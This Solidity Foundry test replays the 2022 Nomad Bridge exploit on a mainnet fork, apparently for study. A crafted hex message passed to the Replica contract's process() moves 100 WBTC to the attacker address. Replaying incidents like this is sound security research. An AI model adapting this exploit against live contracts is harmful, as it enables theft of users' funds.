// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

import "test/utils/TestUtils.sol";

import {ERC20Interface} from "../utils/ERC20Interface.sol";

interface ReplicaInterface {
    function process(bytes memory _message) external returns (bool _success);
}

contract NomadBridgeAttack is TestUtils {
    ERC20Interface wrappedBtc = ERC20Interface(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ReplicaInterface replica = ReplicaInterface(0x5D94309E5a0090b165FA4181519701637B6DAEBA);

    address constant ATTACKER = 0xB5C55f76f90Cc528B2609109Ca14d8d84593590E;

    // We fork one block prior to the actual attack.
    uint256 constant BLOCK_NUMBER = 15_259_100;

    function setUp() public {
        cheat.createSelectFork("mainnet", BLOCK_NUMBER);

        console.log("Setting up Nomad Bridge attack, on block: ", block.number);
    }

    // tx hash: https://etherscan.io/tx/0xb1fe26cc8892f58eb468f5208baaf38bac422b5752cca0b9c8a871855d63ae28
    function testAttack() public {
        uint256 initialBalance = wrappedBtc.balanceOf(address(ATTACKER));
        console.log("attacker initial wbtc balance: ", initialBalance / 10 ** 8);

        bytes memory message =
            hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000b5c55f76f90cc528b2609109ca14d8d84593590e00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
        replica.process(message);

        uint256 postBalance = wrappedBtc.balanceOf(address(ATTACKER));
        console.log("attacker post wbtc balance: ", postBalance / 10 ** 8);

        assertEq(postBalance, 100 * 1e8);
    }
}
